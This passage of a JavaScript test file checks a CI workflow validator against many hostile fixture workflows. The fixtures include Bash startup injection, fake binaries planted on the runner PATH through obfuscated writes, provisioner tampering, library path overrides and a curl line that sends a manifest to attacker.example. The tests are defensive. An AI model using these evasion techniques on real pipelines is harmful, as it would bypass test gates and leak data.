    expect(result.errors).toContain("fixture CI job is missing environment REQUIRE_TEST_DB: '1'");
    expect(result.errors).toContain(
      'fixture path is missing or traverses outside the repository/a symbolic link: tests/fixture.test.mjs'
    );

    for (const scope of [
      'workflow', 'job', 'step', 'prior-step-write', 'encoded-prior-step-write', 'dynamic-target-prior-step-write'
    ]) {
      const workflowEnv = scope === 'workflow'
        ? ['env:', '  BASH_ENV: /tmp/untrusted-startup.sh']
        : [];
      const jobEnv = scope === 'job'
        ? ['    env:', '      BASH_ENV: /tmp/untrusted-startup.sh']
        : [];
      const stepEnv = scope === 'step'
        ? ['        env:', '          BASH_ENV: /tmp/untrusted-startup.sh']
        : [];
      const priorStep = scope === 'prior-step-write'
        ? [
          '      - name: Persist Bash startup injection for later steps',
          '        run: echo "BASH_ENV=/tmp/untrusted-startup.sh" >> "${GITHUB_ENV}"'
        ]
        : scope === 'encoded-prior-step-write'
          ? [
            '      - name: Persist encoded Bash startup injection for later steps',
            '        run: |',
            '          printf \'%s\\n\' \'node() { return 0; }\' > "${RUNNER_TEMP}/startup.sh"',
            '          printf \'\\102ASH_ENV=%s\\n\' "${RUNNER_TEMP}/startup.sh" >> "${GITHUB_ENV}"'
          ]
          : scope === 'dynamic-target-prior-step-write'
            ? [
              '      - name: Persist Bash startup injection through a dynamic environment path',
              '        run: |',
              '          printf \'%s\\n\' \'node() { return 0; }\' > "${RUNNER_TEMP}/startup.sh"',
              '          envkey=GITHUB_',
              '          envkey+=ENV',
              '          printf -v envpath \'%s\' "${!envkey}"',
              '          printf \'\\102ASH_ENV=%s\\n\' "${RUNNER_TEMP}/startup.sh" >> "${envpath}"'
            ]
        : [];
      const workflowLines = [
        ...workflowEnv,
        'jobs:',
        '  critical:',
        ...jobEnv,
        '    steps:',
        ...priorStep,
        '      - name: Startup environment injection fixture',
        ...stepEnv,
        '        run: |',
        ...validRedisSetupAndExport.map((line) => `          ${line}`),
        '          overall_status=0',
        ...validVitestHelper.map((line) => `          ${line}`),
        '          run_vitest_shard vitest-integration',
        '          exit "${overall_status}"'
      ];
      writeWorkflowFixture(root, workflowLines, { isolateBashStartup: false });
      const bashEnvResult = validateSkipPolicy({ root });
      expect(bashEnvResult.errors).toContain(
        'fixture CI job sets an unsafe shell startup or command-resolution environment'
      );
      expect(bashEnvResult.errors).toContain(
        'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
      );
      expect(bashEnvResult.errors).toContain(
        'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
      );

      if (scope === 'dynamic-target-prior-step-write') {
        writeWorkflowFixture(root, workflowLines);
        const isolatedBashEnvResult = validateSkipPolicy({ root });
        expect(isolatedBashEnvResult.errors).toContain(
          'fixture CI job sets an unsafe shell startup or command-resolution environment'
        );
        expect(isolatedBashEnvResult.errors).toContain(
          'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
        );
        expect(isolatedBashEnvResult.errors).toContain(
          'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
        );
      }
    }

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Add fake node through GITHUB_PATH',
      '        run: |',
      '          mkdir -p "${RUNNER_TEMP}/fakebin"',
      '          printf \'%s\\n\' \'#!/bin/sh\' \'exit 0\' > "${RUNNER_TEMP}/fakebin/node"',
      '          chmod +x "${RUNNER_TEMP}/fakebin/node"',
      '          echo "${RUNNER_TEMP}/fakebin" >> "${GITHUB_PATH}"',
      '      - name: Required Redis and Vitest gates',
      '        run: |',
      ...validRedisSetupAndExport.map((line) => `          ${line}`),
      '          overall_status=0',
      ...validVitestHelper.map((line) => `          ${line}`),
      '          run_vitest_shard vitest-integration',
      '          exit "${overall_status}"'
    ]);
    const githubPathResult = validateSkipPolicy({ root });
    expect(githubPathResult.errors).toContain(
      'fixture CI job sets an unsafe shell startup or command-resolution environment'
    );
    expect(githubPathResult.errors).toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );
    expect(githubPathResult.errors).toContain(
      'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Add fake node through dynamically resolved runner path',
      '        run: |',
      '          key=GITHUB_',
      '          key+=PATH',
      '          path_file=$(printenv "$key")',
      '          mkdir -p "${RUNNER_TEMP}/fakebin"',
      '          printf \'%s\\n\' \'#!/bin/sh\' \'exit 0\' > "${RUNNER_TEMP}/fakebin/node"',
      '          chmod +x "${RUNNER_TEMP}/fakebin/node"',
      '          echo "${RUNNER_TEMP}/fakebin" >> "${path_file}"',
      '      - name: Required Redis and Vitest gates',
      '        run: |',
      ...validRedisSetupAndExport.map((line) => `          ${line}`),
      '          overall_status=0',
      ...validVitestHelper.map((line) => `          ${line}`),
      '          run_vitest_shard vitest-integration',
      '          exit "${overall_status}"'
    ]);
    const dynamicGithubPathResult = validateSkipPolicy({ root });
    expect(dynamicGithubPathResult.errors).toContain(
      'fixture CI job sets an unsafe shell startup or command-resolution environment'
    );
    expect(dynamicGithubPathResult.errors).toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );
    expect(dynamicGithubPathResult.errors).toContain(
      'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Add fake node through a nameref runner path',
      '        run: |',
      '          key=GITHUB_',
      '          key+=PATH',
      '          declare -n path_target="$key"',
      '          mkdir -p "${RUNNER_TEMP}/fakebin"',
      '          printf \'%s\\n\' \'#!/bin/sh\' \'exit 0\' > "${RUNNER_TEMP}/fakebin/node"',
      '          chmod +x "${RUNNER_TEMP}/fakebin/node"',
      '          echo "${RUNNER_TEMP}/fakebin" >> "$path_target"',
      '      - name: Required Redis and Vitest gates',
      '        run: |',
      ...validRedisSetupAndExport.map((line) => `          ${line}`),
      '          overall_status=0',
      ...validVitestHelper.map((line) => `          ${line}`),
      '          run_vitest_shard vitest-integration',
      '          exit "${overall_status}"'
    ]);
    const namerefGithubPathResult = validateSkipPolicy({ root });
    expect(namerefGithubPathResult.errors).toContain(
      'fixture CI job sets an unsafe shell startup or command-resolution environment'
    );
    expect(namerefGithubPathResult.errors).toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );
    expect(namerefGithubPathResult.errors).toContain(
      'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Add fake node through a dynamic variable listing',
      '        run: |',
      '          key=GITHUB_',
      '          key+=PATH',
      '          path_decl=$(declare -p "$key")',
      '          path_file=${path_decl#*=}',
      '          path_file=${path_file#\\"}',
      '          path_file=${path_file%\\"}',
      '          mkdir -p "${RUNNER_TEMP}/fakebin"',
      '          printf \'%s\\n\' \'#!/bin/sh\' \'exit 0\' > "${RUNNER_TEMP}/fakebin/node"',
      '          chmod +x "${RUNNER_TEMP}/fakebin/node"',
      '          echo "${RUNNER_TEMP}/fakebin" >> "${path_file}"',
      '      - name: Required Redis and Vitest gates',
      '        run: |',
      ...validRedisSetupAndExport.map((line) => `          ${line}`),
      '          overall_status=0',
      ...validVitestHelper.map((line) => `          ${line}`),
      '          run_vitest_shard vitest-integration',
      '          exit "${overall_status}"'
    ]);
    const dynamicVariableListingResult = validateSkipPolicy({ root });
    expect(dynamicVariableListingResult.errors).toContain(
      'fixture CI job sets an unsafe shell startup or command-resolution environment'
    );
    expect(dynamicVariableListingResult.errors).toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );
    expect(dynamicVariableListingResult.errors).toContain(
      'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
    );

    const procEnvironmentWorkflow = (pathWriteCommands) => [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Add fake node through the process environment file',
      '        run: |',
      '          key=GITHUB_',
      '          key+=PATH',
      '          r=/',
      '          a=pr',
      '          a+=oc/',
      '          r+=$a',
      '          b=self/en',
      '          b+=viron',
      '          path_file=$(tr \'\\0\' \'\\n\' < "${r}${b}" | grep "^${key}=" | cut -d= -f2-)',
      '          mkdir -p "${RUNNER_TEMP}/fakebin"',
      '          printf \'%s\\n\' \'#!/bin/sh\' \'exit 0\' > "${RUNNER_TEMP}/fakebin/node"',
      '          chmod +x "${RUNNER_TEMP}/fakebin/node"',
      ...pathWriteCommands.map((line) => `          ${line}`),
      '      - name: Required Redis and Vitest gates',
      '        run: |',
      ...validRedisSetupAndExport.map((line) => `          ${line}`),
      '          overall_status=0',
      ...validVitestHelper.map((line) => `          ${line}`),
      '          run_vitest_shard vitest-integration',
      '          exit "${overall_status}"'
    ];
    const nativePostgresWorkflow = (setupLines) => [
      ...procEnvironmentWorkflow([]),
      '      - name: Verify private PostgreSQL runtime provenance',
      '        run: |',
      ...setupLines.map((line) => `          ${line}`)
    ];

    for (const historyCommands of [
      [
        'set -o history',
        'history -s "${RUNNER_TEMP}/fakebin"',
        'history -w "${path_file}"'
      ],
      [
        'set -o history',
        'history -c',
        'history -s "${RUNNER_TEMP}/fakebin"',
        'history -aw ${RUNNER_TEMP}/_runner_file_commands/add_path_*'
      ],
      ['fc -W "${path_file}"']
    ]) {
      writeWorkflowFixture(root, procEnvironmentWorkflow(historyCommands));
      const shellHistoryResult = validateSkipPolicy({ root });
      expect(shellHistoryResult.errors).toContain(
        'fixture CI job sets an unsafe shell startup or command-resolution environment'
      );
      expect(shellHistoryResult.errors).toContain(
        'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
      );
      expect(shellHistoryResult.errors).toContain(
        'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
      );
    }

    writeWorkflowFixture(root, procEnvironmentWorkflow(['echo "${RUNNER_TEMP}/fakebin" >> "${path_file}"']));
    const procEnvironmentResult = validateSkipPolicy({ root });
    expect(procEnvironmentResult.errors).toContain(
      'fixture CI job sets an unsafe shell startup or command-resolution environment'
    );
    expect(procEnvironmentResult.errors).toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );
    expect(procEnvironmentResult.errors).toContain(
      'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
    );

    for (const fallbackTarget of [
      '"${path_file:-/dev/null}"',
      '"${path_file-}"',
      "${path_file}''",
      '"${path_file}"'
    ]) {
      const redirection = fallbackTarget === '"${path_file}"'
        ? `echo "\${RUNNER_TEMP}/fakebin">>${fallbackTarget}`
        : `echo "\${RUNNER_TEMP}/fakebin" >> ${fallbackTarget}`;
      writeWorkflowFixture(root, procEnvironmentWorkflow([
        redirection
      ]));
      const fallbackPathResult = validateSkipPolicy({ root });
      expect(fallbackPathResult.errors).toContain(
        'fixture CI job sets an unsafe shell startup or command-resolution environment'
      );
      expect(fallbackPathResult.errors).toContain(
        'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
      );
      expect(fallbackPathResult.errors).toContain(
        'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
      );
    }

    writeWorkflowFixture(root, procEnvironmentWorkflow([
      'path_dir=${path_file%/*}',
      'path_leaf=${path_file##*/}',
      'echo "${RUNNER_TEMP}/fakebin" >> "${path_dir}/${path_leaf}"'
    ]));
    const procEnvironmentSplitPathResult = validateSkipPolicy({ root });
    expect(procEnvironmentSplitPathResult.errors).toContain(
      'fixture CI job sets an unsafe shell startup or command-resolution environment'
    );
    expect(procEnvironmentSplitPathResult.errors).toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );
    expect(procEnvironmentSplitPathResult.errors).toContain(
      'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
    );

    const splitPathWriters = [
      [
        'find "${RUNNER_TEMP}/_runner_file_commands" -type f -name \'add_path_*\' -exec tee -a {} \\;'
      ],
      [
        'timeout 5 find "${RUNNER_TEMP}/_runner_file_commands" -type f -name \'add_path_*\' -exec cp "${RUNNER_TEMP}/path-entry" {} \\;'
      ],
      [
        'find "${RUNNER_TEMP}/_runner_file_commands" -type f -name \'add_path_*\' "-exec" cp "${RUNNER_TEMP}/path-entry" {} \\;'
      ],
      [
        'find "${RUNNER_TEMP}/_runner_file_commands" -type f -name \'add_path_*\' \\-exec cp "${RUNNER_TEMP}/path-entry" {} \\;'
      ],
      [
        'find "${RUNNER_TEMP}/_runner_file_commands" -type f -name \'add_path_*\' -\\exec cp "${RUNNER_TEMP}/path-entry" {} \\;'
      ],
      [
        'find "${RUNNER_TEMP}/_runner_file_commands" -type f -name \'add_path_*\' ""-exec cp "${RUNNER_TEMP}/path-entry" {} \\;'
      ],
      [
        'find "${RUNNER_TEMP}/_runner_file_commands" -type f -name \'add_path_*\' -e"x"ec cp "${RUNNER_TEMP}/path-entry" {} \\;'
      ],
      [
        'cmd=f',
        'cmd+=ind',
        '"$cmd" "${RUNNER_TEMP}/_runner_file_commands" -type f -name \'add_path_*\' -exec cp "${RUNNER_TEMP}/path-entry" {} \\;'
      ],
      [
        ':; cmd=f; cmd+=ind; "$cmd" "${RUNNER_TEMP}/_runner_file_commands" -type f -name \'add_path_*\' -exec cp "${RUNNER_TEMP}/path-entry" {} \\;'
      ],
      [
        'cmd=f',
        'cmd+=ind',
        'timeout 5 "$cmd" "${RUNNER_TEMP}/_runner_file_commands" -type f -name \'add_path_*\' -exec cp "${RUNNER_TEMP}/path-entry" {} \\;'
      ],
      [
        'suffix=ind',
        'f"$suffix" "${RUNNER_TEMP}/_runner_file_commands" -type f -name \'add_path_*\' -exec cp "${RUNNER_TEMP}/path-entry" {} \\;'
      ],
      [
        'suffix=ind',
        'f$(printf ind) "${RUNNER_TEMP}/_runner_file_commands" -type f -name \'add_path_*\' -exec cp "${RUNNER_TEMP}/path-entry" {} \\;'
      ],
      [
        'suffix=ind',
        '`printf f; printf "$suffix"` "${RUNNER_TEMP}/_runner_file_commands" -type f -name \'add_path_*\' -exec cp "${RUNNER_TEMP}/path-entry" {} \\;'
      ],
      [
        'suffix=ind; cat <(f"$suffix" "${RUNNER_TEMP}/_runner_file_commands" -type f -name \'add_path_*\' -exec cp "${RUNNER_TEMP}/path-entry" {} \\;)'
      ],
      [
        'suffix=ind; printf \'%s\\n\' "f${suffix}" | xargs -I % % "${RUNNER_TEMP}/_runner_file_commands" -type f -name \'add_path_*\' -exec cp "${RUNNER_TEMP}/path-entry" {} \\;'
      ],
      [
        'suffix=ind',
        'printf \'%s\\n\' \'f\'"$suffix"\' "${RUNNER_TEMP}/_runner_file_commands" -type f -name add_path_* -exec cp "${RUNNER_TEMP}/path-entry" {} \\;\' > generated.sh',
        'bash generated.sh'
      ],
      [
        'printf \'%s\\n\' \'suffix=ind\' \'f"$suffix" "${RUNNER_TEMP}/_runner_file_commands" -type f -name add_path_* -exec cp "${RUNNER_TEMP}/path-entry" {} \\;\' > scripts/provision-private-coverage-binaries.sh',
        'docker run --rm --interactive ubuntu:22.04 bash -se < scripts/provision-private-coverage-binaries.sh'
      ],
      [
        'printf \'%s\\n\' \'suffix=ind\' \'f"$suffix" "${RUNNER_TEMP}/_runner_file_commands" -type f -name add_path_* -exec cp "${RUNNER_TEMP}/path-entry" {} \\;\' > scripts/provision-private-coverage-binaries.sh',
        'bash -se <scripts/provision-private-coverage-binaries.sh'
      ],
      [
        'suffix=ind',
        'coproc f"$suffix" "${RUNNER_TEMP}/_runner_file_commands" -type f -name \'add_path_*\' -exec cp "${RUNNER_TEMP}/path-entry" {} \\;'
      ],
      [
        'suffix=ind',
        'setsid f"$suffix" "${RUNNER_TEMP}/_runner_file_commands" -type f -name \'add_path_*\' -exec cp "${RUNNER_TEMP}/path-entry" {} \\;'
      ],
      [
        'suffix=ind',
        'exec f"$suffix" "${RUNNER_TEMP}/_runner_file_commands" -type f -name \'add_path_*\' -exec tee -a {} \\;'
      ],
      [
        'suffix=ind',
        '> /dev/null f"$suffix" "${RUNNER_TEMP}/_runner_file_commands" -type f -name \'add_path_*\' -exec tee -a {} \\;'
      ],
      [
        'suffix=ind; printf \'%s\\n\' "f${suffix} ${RUNNER_TEMP}/_runner_file_commands -type f -name add_path_* -exec tee -a {} \\;" | bash'
      ],
      [
        'bash -s < "${RUNNER_TEMP}/generated-shell.sh"'
      ],
      [
        'bash -'
      ],
      [
        'f""ind "${RUNNER_TEMP}/_runner_file_commands" -type f -name \'add_path_*\' -exec cp "${RUNNER_TEMP}/path-entry" {} \\;'
      ],
      [
        'printf \'%s\\n\' "${RUNNER_TEMP}/fakebin" | tee -a "${RUNNER_TEMP}/_runner_file_commands/${GITHUB_PATH##*/}"'
      ],
      [
        'path_dir=${path_file%/*}',
        'path_leaf=${path_file##*/}',
        'printf \'%s\\n\' "${RUNNER_TEMP}/fakebin" > "${RUNNER_TEMP}/path-entry"',
        'cp "${RUNNER_TEMP}/path-entry" "${path_dir}/${path_leaf}"'
      ],
      [
        'path_dir=${path_file%/*}',
        'path_leaf=${path_file##*/}',
        'printf \'%s\\n\' "${RUNNER_TEMP}/fakebin" | tee -a "${path_dir}/${path_leaf}"'
      ],
      [
        'path_dir=${path_file%/*}',
        'path_leaf=${path_file##*/}',
        'printf \'%s\\n\' "${RUNNER_TEMP}/fakebin" > "${RUNNER_TEMP}/path-entry"',
        'tar -cf "${RUNNER_TEMP}/payload.tar" --transform="s/path-entry/${path_leaf}/" -C "${RUNNER_TEMP}" path-entry',
        'tar -xf "${RUNNER_TEMP}/payload.tar" --overwrite -C "${path_dir}"'
      ],
      [
        'printf \'%s\\n\' "${RUNNER_TEMP}/fakebin" | tee ${RUNNER_TEMP}/_runner_file_commands/add_path_*'
      ],
      [
        'cd "${RUNNER_TEMP}/_runner_file_commands"',
        'printf \'%s\\n\' "${RUNNER_TEMP}/fakebin" | tee add_path_*'
      ],
      [
        'set -- ${RUNNER_TEMP}/_runner_file_commands/add_path_*',
        'printf \'%s\\n\' "${RUNNER_TEMP}/fakebin" | tee "$@"'
      ],
      [
        'git log -1 --format="${RUNNER_TEMP}/fakebin" --output=${RUNNER_TEMP}/_runner_file_commands/add_path_*'
      ],
      [
        'path_dir=${path_file%/*}',
        'path_leaf=${path_file##*/}',
        'curl --silent --output "${path_dir}/${path_leaf}" "file://${RUNNER_TEMP}/path-entry"'
      ]
    ];
    for (const writerLines of splitPathWriters) {
      writeWorkflowFixture(root, procEnvironmentWorkflow(writerLines));
      const splitPathWriterResult = validateSkipPolicy({ root });
      expect(splitPathWriterResult.errors).toContain(
        'fixture CI job sets an unsafe shell startup or command-resolution environment'
      );
      expect(splitPathWriterResult.errors).toContain(
        'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
      );
      expect(splitPathWriterResult.errors).toContain(
        'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
      );
    }

    const pinnedProvisionerConsumer = [
      'docker run --rm --interactive \\',
      '  --volume "${deb_dir}:/out" \\',
      '  ubuntu:22.04@sha256:829f6df217bcbae2b371026e81711d1a787c61b2967ad09d015063663ebafbf7 \\',
      '  bash -se < scripts/provision-private-coverage-binaries.sh'
    ];
    const expectProvisionerMutationRejected = (stepName, mutationLines, options = {}) => {
      const workflow = nativePostgresWorkflow(validNativePostgresSetupAndExport);
      const requiredGatesIndex = workflow.findIndex((line) =>
        line === '      - name: Required Redis and Vitest gates'
      );
      expect(requiredGatesIndex).toBeGreaterThan(-1);
      const consumerStep = [
        '      - name: Consume provisioner from a later Docker step',
        ...(options.consumerWorkingDirectory === undefined
          ? []
          : [`        working-directory: ${options.consumerWorkingDirectory}`]),
        '        run: |',
        ...(options.consumerRunLines ?? pinnedProvisionerConsumer).map((line) => `          ${line}`)
      ];
      workflow.splice(requiredGatesIndex, 0,
        `      - name: ${stepName}`,
        '        run: |',
        ...mutationLines.map((line) => `          ${line}`),
        ...consumerStep
      );
      writeWorkflowFixture(root, workflow);
      const result = validateSkipPolicy({ root });
      expect(result.errors).toContain(
        'fixture CI job sets an unsafe shell startup or command-resolution environment'
      );
    };

    writeWorkflowFixture(root, [
      ...nativePostgresWorkflow(validNativePostgresSetupAndExport),
      '      - name: Extract the approved archive under temporary storage',
      '        run: |',
      '          tar -xzf "/tmp/${helm_archive}" -C /tmp',
      '      - name: Consume the checked-in provisioner with the approved pinned command',
      '        run: |',
      ...pinnedProvisionerConsumer.map((line) => `          ${line}`)
    ]);
    const approvedProvisionerConsumerResult = validateSkipPolicy({ root });
    expect(approvedProvisionerConsumerResult.errors).not.toContain(
      'fixture CI job sets an unsafe shell startup or command-resolution environment'
    );

    mkdirSync(join(root, 'scripts'), { recursive: true });
    writeFileSync(join(root, 'scripts', 'fake-provisioner.mjs'), 'process.exit(0);\n');
    const shadowedDockerSetup = [...validNativePostgresSetupAndExport];
    const approvedDockerIndex = shadowedDockerSetup.findIndex((line) => line.startsWith('docker run '));
    expect(approvedDockerIndex).toBeGreaterThan(-1);
    shadowedDockerSetup.splice(approvedDockerIndex, 0,
      'docker() { node scripts/fake-provisioner.mjs; }'
    );
    writeWorkflowFixture(root, nativePostgresWorkflow(shadowedDockerSetup));
    const shadowedDockerResult = validateSkipPolicy({ root });
    expect(shadowedDockerResult.errors).toContain(
      'fixture CI job sets an unsafe shell startup or command-resolution environment'
    );

    const importedDockerSetup = [...validNativePostgresSetupAndExport];
    const importedDockerWorkflow = nativePostgresWorkflow(importedDockerSetup);
    const verificationStepIndex = importedDockerWorkflow.findIndex((line) =>
      line === '      - name: Verify private PostgreSQL runtime provenance'
    );
    const verificationRunIndex = importedDockerWorkflow.findIndex((line, index) =>
      index > verificationStepIndex && line === '        run: |'
    );
    expect(verificationRunIndex).toBeGreaterThan(verificationStepIndex);
    importedDockerWorkflow.splice(verificationRunIndex, 0,
      '        env:',
      "          'BASH_FUNC_docker%%': '() { node scripts/fake-provisioner.mjs; }'"
    );
    writeWorkflowFixture(root, importedDockerWorkflow);
    const importedDockerResult = validateSkipPolicy({ root });
    expect(importedDockerResult.errors).toContain(
      'fixture CI job sets an unsafe shell startup or command-resolution environment'
    );

    expectProvisionerMutationRejected('Replace provisioner in an earlier workflow step', [
      'printf \'%s\\n\' \'suffix=ind\' \'f"$suffix" "${RUNNER_TEMP}/_runner_file_commands" -type f -name add_path_* -exec cp "${RUNNER_TEMP}/path-entry" {} \\;\' > scripts/provision-private-coverage-binaries.sh'
    ]);
    expectProvisionerMutationRejected('Append to provisioner through the PWD alias', [
      'printf \'%s\\n\' \'curl --fail --data-binary @/out/package-manifest https://attacker.example/upload\' >> "${PWD}/scripts/provision-private-coverage-binaries.sh"'
    ]);
    expectProvisionerMutationRejected('Rewrite provisioner with sed in place', [
      "sed -i '1i\\suffix=ind' scripts/provision-private-coverage-binaries.sh"
    ]);
    expectProvisionerMutationRejected('Rewrite provisioner with perl in place', [
      "perl -i -pe 's/placeholder/replaced/' scripts/provision-private-coverage-binaries.sh"
    ]);
    expectProvisionerMutationRejected('Replace the scripts parent with a symlink', [
      'mv scripts scripts.original',
      'ln -s /tmp/evil/scripts'
    ]);
    expectProvisionerMutationRejected('Create the scripts symlink in the current directory', [
      'mv scripts scripts.original',
      'ln -s /tmp/evil/scripts .'
    ]);
    expectProvisionerMutationRejected('Extract an archive into the repository before consumption', [
      'tar -xf untrusted-provisioner.tar -C .'
    ]);
    expectProvisionerMutationRejected('Use a tar long-option abbreviation to escape /tmp', [
      'tar -xf untrusted-provisioner.tar -C /tmp --absolute-name'
    ]);
    expectProvisionerMutationRejected('Execute a helper from a tar checkpoint action', [
      'tar -xf untrusted-provisioner.tar -C /tmp --checkpoint=1 --checkpoint-action=exec=/tmp/mutate.sh'
    ]);
    expectProvisionerMutationRejected('Extract a Debian package into the repository', [
      'dpkg-deb -x malicious.deb .'
    ]);
    expectProvisionerMutationRejected('Apply a patch file to the repository', [
      'git apply malicious.patch'
    ]);
    expectProvisionerMutationRejected('Apply a patch from standard input', [
      'patch -p1 < malicious.patch'
    ]);
    expectProvisionerMutationRejected('Set tar options through the workflow environment file', [
      'echo "TAR_OPTIONS=--absolute-names" >> "${GITHUB_ENV}"'
    ]);
    expectProvisionerMutationRejected('Run the pinned consumer from an altered working directory', [
      'echo prepare'
    ], {
      consumerWorkingDirectory: 'evil'
    });
    expectProvisionerMutationRejected('Change directories before reading the provisioner', [
      'cd evil',
      ...pinnedProvisionerConsumer
    ]);
    expectProvisionerMutationRejected('Run provisioner directly on the host', [
      'bash -se < scripts/provision-private-coverage-binaries.sh'
    ]);
    expectProvisionerMutationRejected('Run provisioner with an unpinned Docker image', [
      'docker run --rm --interactive ubuntu:22.04 bash -se < scripts/provision-private-coverage-binaries.sh'
    ]);

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Export an unverified PostgreSQL executable path',
      '        run: |',
      '          set -euo pipefail',
      '          attacker_bin=/tmp/fake-postgres',
      '          {',
      '            echo "NATIVE_POSTGRES_BIN=${attacker_bin}"',
      '          } >> "${GITHUB_ENV}"',
      '          "${NATIVE_POSTGRES_BIN}/postgres" --version'
    ]);
    const unverifiedPostgresPathResult = validateSkipPolicy({ root });
    expect(unverifiedPostgresPathResult.errors).toContain(
      'fixture CI job sets an unsafe shell startup or command-resolution environment'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Override the PostgreSQL executable path',
      '        env:',
      '          NATIVE_POSTGRES_BIN: /tmp/fake-postgres',
      '        run: |',
      '          "${NATIVE_POSTGRES_BIN}/postgres" --version'
    ]);
    const overriddenPostgresPathResult = validateSkipPolicy({ root });
    expect(overriddenPostgresPathResult.errors).toContain(
      'fixture CI job sets an unsafe shell startup or command-resolution environment'
    );

    const untrustedDpkgExtraction = [...validNativePostgresSetupAndExport];
    const trustedDpkgLoopEnd = untrustedDpkgExtraction.findIndex((line) => line === 'done');
    expect(trustedDpkgLoopEnd).toBeGreaterThan(-1);
    untrustedDpkgExtraction.splice(trustedDpkgLoopEnd + 1, 0,
      'deb=/tmp/attacker.deb',
      'dpkg-deb -x "${deb}" "${runtime_root}"'
    );
    writeWorkflowFixture(root, nativePostgresWorkflow(untrustedDpkgExtraction));
    const untrustedDpkgExtractionResult = validateSkipPolicy({ root });
    expect(untrustedDpkgExtractionResult.errors).toContain(
      'fixture CI job sets an unsafe shell startup or command-resolution environment'
    );

    writeWorkflowFixture(root, nativePostgresWorkflow(validNativePostgresSetupAndExport));
    const validNativePostgresExportResult = validateSkipPolicy({ root });
    expect(validNativePostgresExportResult.errors).not.toContain(
      'fixture CI job sets an unsafe shell startup or command-resolution environment'
    );

    const nativeEnvironmentExportEnd = validNativePostgresSetupAndExport.findIndex((line) =>
      line === '} >> "${GITHUB_ENV}"'
    );
    const nativePostgresVersionCommand = validNativePostgresSetupAndExport.findIndex((line) =>
      line === 'LD_LIBRARY_PATH="${runtime_lib}" "${pg_bin}/postgres" --version'
    );
    const overriddenPerCommandLibraryPath = [...validNativePostgresSetupAndExport];
    overriddenPerCommandLibraryPath[nativePostgresVersionCommand] =
      'LD_LIBRARY_PATH=/tmp/attacker-libs "${pg_bin}/postgres" --version';
    writeWorkflowFixture(root, nativePostgresWorkflow(overriddenPerCommandLibraryPath));
    const overriddenPerCommandLibraryPathResult = validateSkipPolicy({ root });
    expect(overriddenPerCommandLibraryPathResult.errors).toContain(
      'fixture CI job sets an unsafe shell startup or command-resolution environment'
    );

    const mutatingLibraryPath = [...validNativePostgresSetupAndExport];
    mutatingLibraryPath.splice(nativeEnvironmentExportEnd + 1, 0, 'export LD_LIBRARY_PATH=/tmp/attacker-libs');
    writeWorkflowFixture(root, nativePostgresWorkflow(mutatingLibraryPath));
    const mutatingLibraryPathResult = validateSkipPolicy({ root });
    expect(mutatingLibraryPathResult.errors).toContain(
      'fixture CI job sets an unsafe shell startup or command-resolution environment'
    );

    writeWorkflowFixture(root, [
      ...nativePostgresWorkflow(validNativePostgresSetupAndExport),
      '      - name: Override loader path for a verified PostgreSQL binary',
      '        run: |',
      '          LD_LIBRARY_PATH=/tmp/attacker-libs "${NATIVE_POSTGRES_BIN}/postgres" --version'
    ]);
    const laterNativeLibraryOverrideResult = validateSkipPolicy({ root });
    expect(laterNativeLibraryOverrideResult.errors).toContain(
      'fixture CI job sets an unsafe shell startup or command-resolution environment'
    );

    const runtimeRootAssignmentIndex = validNativePostgresSetupAndExport.findIndex((line) =>
      line === 'runtime_root="${RUNNER_TEMP}/critical-coverage-runtime"'
    );
    const reassignedRuntimeRoot = [...validNativePostgresSetupAndExport];
    reassignedRuntimeRoot.splice(runtimeRootAssignmentIndex + 1, 0, 'runtime_root=/tmp/fake-postgres-runtime');
    writeWorkflowFixture(root, nativePostgresWorkflow(reassignedRuntimeRoot));
    const reassignedRuntimeRootResult = validateSkipPolicy({ root });
    expect(reassignedRuntimeRootResult.errors).toContain(
      'fixture CI job sets an unsafe shell startup or command-resolution environment'
    );

    const overriddenRunnerTemp = [
      validNativePostgresSetupAndExport[0],
      'RUNNER_TEMP=/tmp/controlled',
      ...validNativePostgresSetupAndExport.slice(1)
    ];
    writeWorkflowFixture(root, nativePostgresWorkflow(overriddenRunnerTemp));
    const overriddenRunnerTempResult = validateSkipPolicy({ root });
    expect(overriddenRunnerTempResult.errors).toContain(
      'fixture CI job sets an unsafe shell startup or command-resolution environment'
    );

    const runtimeLibDefinitionIndex = validNativePostgresSetupAndExport.findIndex((line) =>
      line === 'runtime_lib="${runtime_root}/usr/lib/x86_64-linux-gnu"'
    );
    const reassignedRuntimeLib = [...validNativePostgresSetupAndExport];
